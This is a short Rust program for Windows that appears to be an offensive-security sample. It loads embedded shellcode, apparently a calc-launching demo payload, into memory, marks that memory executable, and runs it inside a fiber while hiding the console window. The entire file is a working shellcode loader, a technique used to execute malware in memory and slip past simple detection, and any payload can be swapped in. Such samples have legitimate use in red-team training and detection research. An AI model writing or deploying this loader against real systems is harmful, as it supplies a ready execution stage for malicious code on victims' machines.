#![windows_subsystem = "windows"]

use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::FALSE;
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
const SIZE: usize = SHELLCODE.len();

#[cfg(target_os = "windows")]
fn main() {
    let mut old = PAGE_READWRITE;
    unsafe {
        let main_fiber = ConvertThreadToFiber(null());
        if main_fiber.is_null() {
            panic!("ConvertThreadToFiber failed!");
        }

        let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if dest.is_null() {
            panic!("VirtualAlloc failed!");
        }

        copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);
        let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("VirtualProtect failed!");
        }

        let dest = transmute(dest);
        let fiber = CreateFiber(0, dest, null());
        if fiber.is_null() {
            panic!("CreateFiber failed!");
        }

        SwitchToFiber(fiber);
        SwitchToFiber(main_fiber);
    }
}
